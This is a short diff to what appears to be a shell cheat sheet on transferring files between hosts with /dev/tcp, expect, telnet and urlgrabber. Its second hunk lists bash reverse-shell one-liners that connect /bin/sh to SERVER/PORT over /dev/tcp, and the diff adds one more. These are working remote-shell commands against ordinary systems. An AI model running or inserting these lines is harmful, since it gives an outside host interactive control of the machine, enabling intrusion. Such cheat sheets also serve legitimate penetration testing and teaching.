@@ -34,7 +34,7 @@ NOTE:
         [client]$ exec 3<> /dev/tcp/SERVER/80; printf "GET /file.name HTTP/1.0\r\n\r\n" >&3; cat <&3 > /tmp/out.file
         [client]$ expect -c 'spawn telnet SERVER 80; expect -re "Escape character is '^]'."; send "GET /file.name HTTP/1.0\r\n\r\n"; interact' > /tmp/out.file
 
-    -: Python 
+    -: Python
         urlgrabber - a simple client for the urlgrabber python package
 
         [client]$ urlgrabber -o /path/to/out.file http://server/path/to/file
@@ -162,6 +162,7 @@ NOTE:
 
     exec 5<>/dev/tcp/SERVER/PORT; cat <&5 | while read line; do $line 2>&5 >&5; done
     exec /bin/sh 0</dev/tcp/SERVER/PORT 1>&0 2>&0
+    /bin/sh 0</dev/tcp/SERVER/PORT 1>&0 2>&0
     0<&196;exec 196<>/dev/tcp/SERVER/PORT; sh <&196 >&196 2>&196
 
 
